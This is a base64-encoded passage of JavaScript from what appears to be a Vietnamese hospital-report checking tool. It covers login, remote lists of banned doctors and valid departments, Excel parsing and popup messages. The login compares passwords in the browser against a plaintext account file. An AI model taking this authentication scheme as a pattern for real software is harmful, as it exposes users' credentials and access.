kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9naW5FcnJvcicpOw0KDQogIGJ0bkxvZ2luLmRpc2FibGVkID0gdHJ1ZTsNCiAgYnRuTG9naW4uaW5uZXJIVE1MID0gJzxpIGNsYXNzPSJmYXMgZmEtc3Bpbm5lciBmYS1zcGluIj48L2k+IMSQYW5nIMSRxINuZyBuaOG6rXAuLi4nOw0KDQogIGNvbnN0IHBvcHVwICAgICAgID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdQb3B1cCcpOw0KICBjb25zdCBsb2FkaW5nVGV4dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2FkaW5nVGV4dCcpOw0KICBjb25zdCBwcm9ncmVzc0JhciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9ncmVzc0JhcicpOw0KDQogIGxldCBsb2dpblBvcHVwU2hvd24gPSBmYWxzZTsNCg0KICAvLyBTYXUgMnMga2nhu4NtIHRyYTogduG6q24g4bufIHRyYW5nIMSRxINuZyBuaOG6rXAgJiDEkWFuZyBsb2FkaW5nPw0KY29uc3Qgc2xvd0xvZ2luVGltZXIgPSBzZXRUaW1lb3V0KCgpID0+IHsNCiAgICBpZiAoIWlzTG9naW5BY3Rpb24pIHJldHVybjsgLy8g4pyFIFRow6ptIGTDsm5nIG7DoHkNCiAgICBjb25zdCBsb2dpblNlY3Rpb25WaXNpYmxlID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgIT09ICdub25lJzsNCiAgICBjb25zdCBzdGlsbExvYWRpbmcgPSBidG5Mb2dpbi5pbm5lckhUTUwuaW5jbHVkZXMoJ8SQYW5nIMSRxINuZyBuaOG6rXAnKTsNCiAgICBpZiAobG9naW5TZWN0aW9uVmlzaWJsZSAmJiBzdGlsbExvYWRpbmcpIHsNCiAgICAgIGxvYWRpbmdUZXh0LmlubmVySFRNTCA9IGANCiAgICAgICAgPGkgY2xhc3M9ImZhcyBmYS1zYXRlbGxpdGUtZGlzaCBmYS1zcGluIiBzdHlsZT0iZm9udC1zaXplOjI0cHg7Y29sb3I6I2U2N2UyMjttYXJnaW4tYm90dG9tOjEwcHg7Ij48L2k+PGJyLz4NCiAgICAgICAgPHN0cm9uZz7EkMaw4budbmcgdHJ1eeG7gW4gZ2nDoW4gxJFv4bqhbjwvc3Ryb25nPjxici8+PGJyLz4NCiAgICAgICAgVnVpIGzDsm5nIMSR4bujaSB2w6BpIGdpw6J5IMSR4buDIGto4bufaSDEkeG7mW5nIG3DoXkgY2jhu6cgZOG7sSBwaMOybmcuLi4NCiAgICAgIGA7DQogICAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9ICcwJSc7DQogICAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOw0KICAgICAgcmVxdWVzdEFuaW1hdGlvbkZyYW1lKCgpID0+IHBvcHVwLmNsYXNzTGlzdC5hZGQoJ3Nob3cnKSk7DQogICAgICBsb2dpblBvcHVwU2hvd24gPSB0cnVlOw0KICAgIGxldCBwZXJjZW50ID0gMDsNCnByb2dyZXNzQmFyLnN0eWxlLnRyYW5zaXRpb24gPSAnd2lkdGggMC4ycyBsaW5lYXInOw0KY29uc3QgcHJvZ3Jlc3NUaW1lciA9IHNldEludGVydmFsKCgpID0+IHsNCiAgICBwZXJjZW50ICs9IDI7IC8vIHTEg25nIG3hu5dpIGzhuqduIDIlDQogICAgaWYgKHBlcmNlbnQgPiAxMDApIHsNCiAgICAgICAgcGVyY2VudCA9IDEwMDsNCiAgICAgICAgY2xlYXJJbnRlcnZhbChwcm9ncmVzc1RpbWVyKTsNCiAgICB9DQogICAgcHJvZ3Jlc3NCYXIuc3R5bGUud2lkdGggPSBwZXJjZW50ICsgJyUnOw0KfSwgNTAwKTsgLy8gMTAwbXMgY+G6rXAgbmjhuq10IDEgbOG6p24NCg0KCQ0KCX0NCiAgfSwgMjAwMCk7DQoNCiAgdHJ5IHsNCiAgICBjb25zdCBhY2NvdW50cyA9IGF3YWl0IGxvYWRBY2NvdW50c0Zyb21UWFQoKTsNCiAgICBpZiAoYWNjb3VudHNbdXNlcm5hbWVdICYmIGFjY291bnRzW3VzZXJuYW1lXSA9PT0gcGFzc3dvcmQpIHsNCiAgICAgIGN1cnJlbnRVc2VyID0gdXNlcm5hbWU7DQogICAgICBzZXNzaW9uU3RvcmFnZS5zZXRJdGVtKCdtZWRVc2VyJywgdXNlcm5hbWUpOw0KICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFpbkNvbnRlbnQnKS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgIGxvZ2luRXJyb3Iuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgIGRvY3VtZW50LmJvZHkuY2xhc3NMaXN0LnJlbW92ZSgnbG9naW4tcGFnZScpOw0KDQogICAgICBhd2FpdCBpbml0QWZ0ZXJMb2dpbigpOyAvLyBjaOG7iSBsb2FkIHNhdSBraGkgbG9naW4gdGjDoG5oIGPDtG5nDQogICAgfSBlbHNlIHsNCiAgICAgIGxvZ2luRXJyb3Iuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgfQ0KICB9IGNhdGNoIChlcnIpIHsNCiAgICBjb25zb2xlLmVycm9yKCdM4buXaSBraGkgxJHEg25nIG5o4bqtcDonLCBlcnIpOw0KICAgIGxvZ2luRXJyb3Iuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogIH0gZmluYWxseSB7DQogICAgY2xlYXJUaW1lb3V0KHNsb3dMb2dpblRpbWVyKTsNCg0KICAgIC8vIE7hur91IHBvcHVwIGRvIGxvZ2luIG3hu58gdGjDrCDEkcOzbmcNCiAgICBpZiAobG9naW5Qb3B1cFNob3duICYmIHBvcHVwKSB7DQogICAgICBwb3B1cC5jbGFzc0xpc3QucmVtb3ZlKCdzaG93Jyk7DQogICAgICBzZXRUaW1lb3V0KCgpID0+IHsgcG9wdXAuc3R5bGUuZGlzcGxheSA9ICdub25lJzsgfSwgNDAwKTsNCiAgICB9DQoNCiAgICBidG5Mb2dpbi5kaXNhYmxlZCA9IGZhbHNlOw0KICAgIGJ0bkxvZ2luLmlubmVySFRNTCA9ICfEkMSDbmcgbmjhuq1wJzsNCiAgfQ0KfQ0KDQoNCiAgICAgICAgZnVuY3Rpb24gbG9nb3V0KCkgew0KICAgICAgICAgICAgY3VycmVudFVzZXIgPSBudWxsOw0KICAgICAgICAgICAgc2Vzc2lvblN0b3JhZ2UucmVtb3ZlSXRlbSgnbWVkVXNlcicpOw0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21haW5Db250ZW50Jykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1c2VybmFtZUlucHV0JykudmFsdWUgPSAnJzsNCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXNzd29yZElucHV0JykudmFsdWUgPSAnJzsNCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbkVycm9yJykuc3R5bGUuZGlzcGxheSA9ICdub25lJzsNCiAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuY2xhc3NMaXN0LmFkZCgnbG9naW4tcGFnZScpOw0KICAgICAgICB9DQovLyBIw6BtIGtp4buDbSB0cmEgYsOhYyBzxKkgdHJvbmcgZGFuaCBzw6FjaCBj4bqlbQ0KYXN5bmMgZnVuY3Rpb24gbG9hZEJhbm5lZERvY3RvcnMoKSB7DQogICAgY29uc3QgdXJsID0gJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jaGF1aHV5bmgwMTA0L2NoYXVodXluaDAxMDQudHh0L3JlZnMvaGVhZHMvbWFpbi9saXN0YmFuLnR4dCc7DQogICAgdHJ5IHsNCiAgICAgICAgY29uc3QgcmVzID0gYXdhaXQgZmV0Y2godXJsKTsNCiAgICAgICAgY29uc3QgdGV4dCA9IGF3YWl0IHJlcy50ZXh0KCk7DQogICAgICAgIGNvbnN0IGJhbm5lZERvY3RvcnMgPSB0ZXh0LnNwbGl0KCdcbicpDQogICAgICAgICAgICAubWFwKGxpbmUgPT4gbGluZS50cmltKCkudG9Mb3dlckNhc2UoKSkNCiAgICAgICAgICAgIC5maWx0ZXIobGluZSA9PiBsaW5lLmxlbmd0aCA+IDApOw0KICAgICAgICByZXR1cm4gYmFubmVkRG9jdG9yczsNCiAgICB9IGNhdGNoIChlcnIpIHsNCiAgICAgICAgY29uc29sZS5lcnJvcigiS2jDtG5nIHRo4buDIHThuqNpIGRhbmggc8OhY2ggYsOhYyBzxKkgYuG7iyBj4bqlbToiLCBlcnIpOw0KICAgICAgICByZXR1cm4gW107DQogICAgfQ0KfQ0KDQovLyBIw6BtIGtp4buDbSB0cmEgeGVtIGLDoWMgc8SpIGPDsyB0cm9uZyBkYW5oIHPDoWNoIGPhuqVtIGtow7RuZw0KZnVuY3Rpb24gY2hlY2tCYW5uZWREb2N0b3IoZG9jdG9yTmFtZSwgYmFubmVkRG9jdG9ycykgew0KICAgIGlmICghZG9jdG9yTmFtZSB8fCBkb2N0b3JOYW1lID09PSAnS2jDtG5nIGPDsycpIHJldHVybiBmYWxzZTsNCiAgICANCiAgICBjb25zdCBkb2N0b3JMb3dlciA9IGRvY3Rvck5hbWUudG9Mb3dlckNhc2UoKS50cmltKCk7DQogICAgcmV0dXJuIGJhbm5lZERvY3RvcnMuc29tZShiYW5uZWQgPT4gZG9jdG9yTG93ZXIuaW5jbHVkZXMoYmFubmVkKSk7DQp9DQovLyA9PT09PT09PT09IEjDgE0gTE9BRCBEQU5IIFPDgUNIIEtIT0EgSOG7olAgTOG7hiA9PT09PT09PT09IC8vDQphc3luYyBmdW5jdGlvbiBsb2FkVmFsaWREZXBhcnRtZW50cygpIHsNCiAgICBjb25zdCB1cmwgPSAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NoYXVodXluaDAxMDQvY2hhdWh1eW5oMDEwNC50eHQvcmVmcy9oZWFkcy9tYWluL2tob2EudHh0JzsNCiAgICB0cnkgew0KICAgICAgICBjb25zdCByZXMgPSBhd2FpdCBmZXRjaCh1cmwpOw0KICAgICAgICBjb25zdCB0ZXh0ID0gYXdhaXQgcmVzLnRleHQoKTsNCiAgICAgICAgY29uc3Qga2hvYUxpc3QgPSB0ZXh0LnNwbGl0KCdcbicpLm1hcChsaW5lID0+IGxpbmUudHJpbSgpLnRvTG93ZXJDYXNlKCkpLmZpbHRlcihCb29sZWFuKTsNCiAgICAgICAgcmV0dXJuIGtob2FMaXN0Ow0KICAgIH0gY2F0Y2ggKGVycikgew0KICAgICAgICBjb25zb2xlLmVycm9yKCJLaMO0bmcgdGjhu4MgdOG6o2kgZGFuaCBzw6FjaCBraG9hOiIsIGVycik7DQogICAgICAgIHJldHVybiBbXTsNCiAgICB9DQp9DQoNCg0KDQogICAgICAgIC8vID09PT09PT09PT0gUEjhuqZOIFjhu6wgTMOdIEZJTEUgPT09PT09PT09PSAvLw0KZnVuY3Rpb24gaGFuZGxlRmlsZSgpIHsNCiAgICBjb25zdCBmaWxlSW5wdXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZmlsZUlucHV0Jyk7DQogICAgY29uc3QgYW5hbHl6ZUJ0biA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhbmFseXplQnRuJyk7DQogICAgY29uc3QgZmlsZSA9IGZpbGVJbnB1dC5maWxlc1swXTsNCgkNCmlmICghZmlsZSkgew0KICAgIGNvbnN0IHBvcHVwID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdQb3B1cCcpOw0KICAgIGNvbnN0IGxvYWRpbmdUZXh0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdUZXh0Jyk7DQogICAgY29uc3QgcHJvZ3Jlc3NCYXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJvZ3Jlc3NCYXInKTsNCg0KICAgIGxvYWRpbmdUZXh0LmlubmVySFRNTCA9IGANCiAgICAgICAgPGkgY2xhc3M9ImZhcyBmYS1leGNsYW1hdGlvbi10cmlhbmdsZSIgc3R5bGU9ImZvbnQtc2l6ZToyNHB4O2NvbG9yOnJlZDttYXJnaW4tYm90dG9tOjEwcHg7Ij48L2k+PGJyLz4NCiAgICAgICAgPHN0cm9uZz5WdWkgbMOybmcgY2jhu41uIGZpbGUgdHLGsOG7m2Mga2hpIGtp4buDbSB0cmE8L3N0cm9uZz48YnIvPjxici8+DQogICAgICAgIDxidXR0b24gY2xhc3M9ImJ0biIgb25jbGljaz0iZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdQb3B1cCcpLnN0eWxlLmRpc3BsYXk9J25vbmUnIj7EkMOzbmc8L2J1dHRvbj4NCiAgICBgOw0KICAgIHByb2dyZXNzQmFyLnN0eWxlLndpZHRoID0gJzAlJzsNCiAgICANCiAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOw0KICAgIHBvcHVwLmNsYXNzTGlzdC5hZGQoJ3Nob3cnKTsNCiAgICByZXR1cm47DQp9DQoNCg0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmaWxlUmVxdWlyZW1lbnRzJykuY2xhc3NMaXN0LmFkZCgnaGlkZGVuJyk7DQogICAgZXJyb3JMb2cgPSBbXTsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVzdWx0U2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yU2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgYW5hbHl6ZUJ0bi5kaXNhYmxlZCA9IHRydWU7DQogICAgYW5hbHl6ZUJ0bi5pbm5lckhUTUwgPSAnPGkgY2xhc3M9ImZhcyBmYS1zcGlubmVyIGZhLXNwaW4iPjwvaT4gxJBhbmcga2nhu4NtIHRyYS4uLic7DQogICAgLy8g4pyFIELhuq90IMSR4bqndSDEkeG6v20gMnMgxJHhu4MgaGnhu4duIHBvcHVwIG7hur91IHbhuqtuIMSRYW5nICLEkGFuZyBraeG7g20gdHJhLi4uIg0KY2xlYXJUaW1lb3V0KGFuYWx5emVQb3B1cFRpbWVyKTsNCmFuYWx5emVQb3B1cFRpbWVyID0gc2V0VGltZW91dCgoKSA9PiB7DQogICAgY29uc3QgYnRuQW5hbHl6ZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhbmFseXplQnRuJyk7DQogICAgaWYgKGJ0bkFuYWx5emUuaW5uZXJIVE1MLmluY2x1ZGVzKCfEkGFuZyBraeG7g20gdHJhJykpIHsNCiAgICAgICAgY29uc3QgcG9wdXAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1BvcHVwJyk7DQogICAgICAgIGNvbnN0IGxvYWRpbmdUZXh0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdUZXh0Jyk7DQogICAgICAgIGNvbnN0IHByb2dyZXNzQmFyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Byb2dyZXNzQmFyJyk7DQoNCiAgICAgICAgbG9hZGluZ1RleHQuaW5uZXJIVE1MID0gYA0KICAgICAgICAgICAgPGkgY2xhc3M9ImZhcyBmYS1zYXRlbGxpdGUtZGlzaCBpY29uLXNwaW4iIHN0eWxlPSJmb250LXNpemU6MjRweDtjb2xvcjojZTY3ZTIyO21hcmdpbi1ib3R0b206MTBweDsiPjwvaT48YnIvPg0KICAgICAgICAgICAgPHN0cm9uZz7EkMaw4budbmcgdHJ1eeG7gW4gZ2nDoW4gxJFv4bqhbjwvc3Ryb25nPjxici8+DQogICAgICAgICAgICBWdWkgbMOybmcgxJHhu6NpIHbDoGkgZ2nDonkgxJHhu4Mga2jhu59pIMSR4buZbmcgbcOheSBjaOG7pyBk4buxIHBow7JuZy4uLg0KICAgICAgICBgOw0KICAgICAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9ICcwJSc7DQogICAgICAgIHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7DQogICAgICAgIHJlcXVlc3RBbmltYXRpb25GcmFtZSgoKSA9PiBwb3B1cC5jbGFzc0xpc3QuYWRkKCdzaG93JykpOw0KDQogICAgICAgIC8vIENo4bqheSBwcm9ncmVzc0JhciAlDQogICAgICAgIGxldCBwZXJjZW50ID0gMDsNCiAgICAgICAgcHJvZ3Jlc3NCYXIuc3R5bGUudHJhbnNpdGlvbiA9ICd3aWR0aCAwLjJzIGxpbmVhcic7DQogICAgICAgIGNvbnN0IHByb2dyZXNzVGltZXIgPSBzZXRJbnRlcnZhbCgoKSA9PiB7DQogICAgICAgICAgICBwZXJjZW50ICs9IDI7DQogICAgICAgICAgICBpZiAocGVyY2VudCA+IDEwMCkgew0KICAgICAgICAgICAgICAgIHBlcmNlbnQgPSAxMDA7DQogICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChwcm9ncmVzc1RpbWVyKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHByb2dyZXNzQmFyLnN0eWxlLndpZHRoID0gcGVyY2VudCArICclJzsNCiAgICAgICAgfSwgMTAwKTsNCiAgICB9DQp9LCA1MDAwKTsNCg0KICAgIGNvbnN0IHJlYWRlciA9IG5ldyBGaWxlUmVhZGVyKCk7DQogICAgDQogICAgcmVhZGVyLm9ubG9hZCA9IGFzeW5jIGZ1bmN0aW9uKGUpIHsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGNvbnN0IGRhdGEgPSBuZXcgVWludDhBcnJheShlLnRhcmdldC5yZXN1bHQpOw0KICAgICAgICAgICAgY29uc3Qgd29ya2Jvb2sgPSBYTFNYLnJlYWQoZGF0YSwgeyB0eXBlOiAnYXJyYXknIH0pOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAod29ya2Jvb2suU2hlZXROYW1lcy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoJ0ZpbGUgRXhjZWwga2jDtG5nIGPDsyBzaGVldCBuw6BvJyk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIGNvbnN0IGZpcnN0U2hlZXQgPSB3b3JrYm9vay5TaGVldHNbd29ya2Jvb2suU2hlZXROYW1lc1sxXV07DQogICAgICAgICAgICBjb25zdCBqc29uRGF0YSA9IFhMU1gudXRpbHMuc2hlZXRfdG9fanNvbihmaXJzdFNoZWV0LCB7IA0KICAgICAgICAgICAgICAgIGhlYWRlcjogMSwgDQogICAgICAgICAgICAgICAgZGVmdmFsOiAiIiwgDQogICAgICAgICAgICAgICAgYmxhbmtyb3dzOiB0cnVlIA0KICAgICAgICAgICAgfSk7DQogICAgICAgICAgICBjb25zdCBkb25nNSA9IChqc29uRGF0YVs0XSAmJiBqc29uRGF0YVs0XVswXSkgPyBqc29uRGF0YVs0XVswXS50b1N0cmluZygpLnRyaW0oKSA6ICJLaMO0bmcgcsO1IjsNCmNvbnN0IGRvbmc2ID0gKGpzb25EYXRhWzVdICYmIGpzb25EYXRhWzVdWzBdKSA/IGpzb25EYXRhWzVdWzBdLnRvU3RyaW5nKCkudHJpbSgpIDogIktow7RuZyByw7UiOw0Kd2luZG93Lm5nYXlWYWx1ZSA9IGRvbmc1OyAgLy8g4qyFIGTDsm5nIDUgPSBOZ8OgeQ0Kd2luZG93Lmtob2FWYWx1ZSA9IGRvbmc2OyAgLy8g4qyFIGTDsm5nIDYgPSBLaG9hDQoNCg0KLy8vLyBLaeG7g20gdHJhIGtob2EgLy8vLy8NCi8vIOKchSBM4bqleSBk4buvIGxp4buHdSBkw7JuZyA2LCBj4buZdCBBDQpjb25zdCBraG9hUm93ID0ganNvbkRhdGFbNV07IC8vIGTDsm5nIDYNCmNvbnN0IGtob2FUZXh0ID0gKGtob2FSb3cgJiYga2hvYVJvd1swXSB8fCAiIikudG9TdHJpbmcoKS50cmltKCk7DQpjb25zdCBraG9hTG93ZXIgPSBraG9hVGV4dC50b0xvd2VyQ2FzZSgpOw0KDQovLyDinIUgS2nhu4NtIHRyYSB0w6puIGtob2EgLSBT4busQSBM4buWSSBUT8OATiBESeG7hk4NCmNvbnN0IHZhbGlkS2hvYUxpc3QgPSBhd2FpdCBsb2FkVmFsaWREZXBhcnRtZW50cygpOw0KDQovLyBM4buNYyBi4buPIGtob2EgcuG7l25nIHbDoCBjaHXhuqluIGjDs2EgZGFuaCBzw6FjaCBraG9hIGjhu6NwIGzhu4cNCmNvbnN0IGNsZWFuVmFsaWRLaG9hTGlzdCA9IHZhbGlkS2hvYUxpc3QNCiAgICAuZmlsdGVyKGtob2EgPT4ga2hvYSAmJiBraG9hLnRyaW0oKSkgLy8gTG/huqFpIGLhu48ga2hvYSBy4buXbmcNCiAgICAubWFwKGtob2EgPT4ga2hvYS50b0xvd2VyQ2FzZSgpLnRyaW0oKSk7IC8vIENodeG6qW4gaMOzYSB24buBIGNo4buvIHRoxrDhu51uZw0KDQovLyDEkOG6v20gc+G7kSBraG9hIGjhu6NwIGzhu4cgxJHGsOG7o2MgdMOsbSB0aOG6pXkgdsOgIGzGsHUgZGFuaCBzw6FjaCBraG9hIHTDrG0gdGjhuqV5DQpsZXQgdmFsaWRLaG9hQ291bnQgPSAwOw0KbGV0IGZvdW5kS2hvYXMgPSBbXTsgLy8gTeG6o25nIGzGsHUgdOG6pXQgY+G6oyBraG9hIHTDrG0gdGjhuqV5IHThu6sgZmlsZSBFeGNlbA0KDQovLyBLaeG7g20gdHJhIHThu6tuZyBraG9hIGjhu6NwIGzhu4cNCmNsZWFuVmFsaWRLaG9hTGlzdC5mb3JFYWNoKGtob2EgPT4gew0KICAgIGlmIChraG9hTG93ZXIuaW5jbHVkZXMoa2hvYSkpIHsNCiAgICAgICAgdmFsaWRLaG9hQ291bnQrKzsNCiAgICAgICAgZm91bmRLaG9hcy5wdXNoKGtob2EpOyAvLyBUaMOqbSB2w6BvIG3huqNuZw0KICAgIH0NCn0pOw0KDQovLyBDaOG7iSBjaG8gcGjDqXAgRFVZIE5I4bqkVCAxIGtob2EgaOG7o3AgbOG7hw0KaWYgKHZhbGlkS2hvYUNvdW50ID09PSAwKSB7DQogICAgLy8gS2jDtG5nIHTDrG0gdGjhuqV5IGtob2EgbsOgbyBo4bujcCBs4buHDQogICAgd2luZG93LmlzS2hvYUxvaSA9IHRydWU7DQogICAgY29uc3QgbXNnID0gYOKdjCBNw6F5IGNo4bunIHThu6sgY2jhu5FpICIke2tob2FUZXh0IHx8ICdLaMO0bmcgeMOhYyDEkeG7i25oJ30iIHPhu60gZOG7pW5nIHBo4bqnbiBt4buBbS4gPGJyLz48Y2VudGVyPlZ1aSBsw7JuZyBtdWEgYuG6o24gcXV54buBbiDEkeG7gyB0w7RuIHRy4buNbmcgdMOhYyBnaeG6oy48L2NlbnRlcj5gOw0KDQogICAgc2hvd0tob2FFcnJvclBvcHVwKG1zZyk7DQogICAgcmV0dXJuOw0KfSBlbHNlIGlmICh2YWxpZEtob2FDb3VudCA+IDEpIHsNCiAgICAvLyBUw6xtIHRo4bqleSBuaGnhu4F1IGjGoW4gMSBraG9hIC0gSEnhu4JOIFRI4buKIE7hu5hJIERVTkcgR+G7kEMgVOG7qiBGSUxFIEVYQ0VMDQogICAgd2luZG93LmlzS2hvYUxvaSA9IHRydWU7DQogICAgDQogICAgY29uc3QgbXNnID0gYOKdjCBNw6F5IGNo4bunIHBow6F0IGhp4buHbiBk4buvIGxp4buHdSBjaOG7qWEgPGI+bmhp4buBdSBraG9hPC9iPi4gQ2jhu4kgxJHGsOG7o2MgcGjDqXAgZMO5bmcgbeG7l2kgbOG6p24gMSBraG9hIGR1eSBuaOG6pXQuPGJyPjxicj4NCiAgICAgICAgICAgICAgICA8Yj5LaG9hIMSRw6MgY2jhuqF5IHRyb25nIGThu68gbGnhu4d1OjwvYj48YnI+DQogICAgICAgICAgICAgICAgPGRpdiBzdHlsZT0iYmFja2dyb3VuZDojZjhmOWZhOyBwYWRkaW5nOjEwcHg7IGJvcmRlci1yYWRpdXM6NXB4OyBib3JkZXI6MXB4IHNvbGlkICNkZGQ7IG1hcmdpbjoxMHB4IDA7Ij4NCiAgICAgICAgICAgICAgICAke2tob2FUZXh0fQ0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgIDxiPktob2EgxJHDoyBtdWEgYuG6o24gcXV54buBbjo8L2I+PGJyPg0KICAgICAgICAgICAgICAgICR7Zm91bmRLaG9hcy5tYXAoa2hvYSA9PiBg4oCiICR7a2hvYS5jaGFyQXQoMCkudG9VcHBlckNhc2UoKSArIGtob2Euc2xpY2UoMSl9YCkuam9pbignPGJyPicpfQ0KICAgICAgICAgICAgICAgYDsNCg0KICAgIHNob3dLaG9hRXJyb3JQb3B1cChtc2cpOw0KICAgIHJldHVybjsNCn0NCg0KLy8g4pyFIE7hur91IGNo4buJIGPDsyAxIGtob2EgaOG7o3AgbOG7hyAtPiBDaG8gcGjDqXAgdGnhur9wIHThu6VjDQpjb25zb2xlLmxvZyhg4pyFIEtob2EgaOG7o3AgbOG7hzogJHtmb3VuZEtob2FzWzBdfWApOw0KDQovLyA9PT0gxJDhurZUIMSQT+G6oE4gTsOAWSBTQVUgS0hJIMSQw4MgQ8OTIGNvbWJpbmVkSGVhZGVycyA9PT0NCi8vIFTDrG0gY8OhYyBj4buZdCBj4bqnbiB0aGnhur90IHThu6sgaGVhZGVyDQpjb25zdCBoZWFkZXJMaW5lMSA9IGpzb25EYXRhWzddIHx8IFtdOw0KY29uc3QgaGVhZGVyTGluZTIgPSBqc29uRGF0YVs4XSB8fCBbXTsNCmNvbnN0IGNvbWJpbmVkSGVhZGVycyA9IGhlYWRlckxpbmUxLm1hcCgoY29sLCBpbmRleCkgPT4gDQogICAgKGNvbCArICcgJyArIChoZWFkZXJMaW5lMltpbmRleF0gfHwgJycpKS50cmltKCkNCik7DQoNCi8vIOKchSBLSeG7gk0gVFJBIELDgUMgU8SoIFRST05HIERBTkggU8OBQ0ggQ+G6pE0NCmNvbnN0IGJhbm5lZERvY3RvcnMgPSBhd2FpdCBsb2FkQmFubmVkRG9jdG9ycygpOw0KbGV0IGJhbm5lZERvY3RvckZvdW5kID0gbnVsbDsNCg0KLy8gVMOsbSBj4buZdCBiw6FjIHPEqSBjaOG7iSDEkeG7i25oDQpjb25zdCBkb2N0b3JJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJCw6FjIHPhu7kgY2jhu4kgxJHhu4tuaCIpKTsNCg0KaWYgKGRvY3RvckluZGV4ICE9PSAtMSkgew0KICAgIC8vIER1eeG7h3QgcXVhIGPDoWMgZMOybmcgZOG7ryBsaeG7h3UgxJHhu4MgdMOsbSBiw6FjIHPEqSBi4buLIGPhuqVtDQogICAgY29uc3Qgcm93cyA9IGpzb25EYXRhLnNsaWNlKDkpOw0KICAgIGZvciAoY29uc3Qgcm93IG9mIHJvd3MpIHsNCiAgICAgICAgY29uc3QgZG9jdG9yTmFtZSA9IHJvd1tkb2N0b3JJbmRleF07DQogICAgICAgIGlmIChkb2N0b3JOYW1lICYmIGNoZWNrQmFubmVkRG9jdG9yKGRvY3Rvck5hbWUsIGJhbm5lZERvY3RvcnMpKSB7DQogICAgICAgICAgICBiYW5uZWREb2N0b3JGb3VuZCA9IGRvY3Rvck5hbWU7DQogICAgICAgICAgICBicmVhazsNCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KLy8gTuG6v3UgdMOsbSB0aOG6pXkgYsOhYyBzxKkgYuG7iyBj4bqlbSwgaGnhu4NuIHRo4buLIHBvcHVwIGzhu5dpDQppZiAoYmFubmVkRG9jdG9yRm91bmQpIHsNCiAgICB3aW5kb3cuaXNLaG9hTG9pID0gdHJ1ZTsNCiAgICBjb25zdCBtc2cgPSBg4p2MIFZ1aSBMw7JuZyBUw7RuIFRy4buNbmcgVMOhYyBHaeG6oy4gxJDhu6tuZyBD4buRIEJ1ZyBT4butIEThu6VuZyBDaMO5YS4gSMOjeSBWxINuIE1pbmhgOw0KICAgIHNob3dLaG9hRXJyb3JQb3B1cChtc2cpOw0KICAgIHJldHVybjsNCn0NCg0KLy8gSMOgbSBoaeG7g24gdGjhu4sgcG9wdXAgbOG7l2kga2hvYQ0KZnVuY3Rpb24gc2hvd0tob2FFcnJvclBvcHVwKGVycm9yTWVzc2FnZSkgew0KICAgIGNvbnN0IHBvcHVwID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvYWRpbmdQb3B1cCcpOw0KICAgIGNvbnN0IGxvYWRpbmdUZXh0ID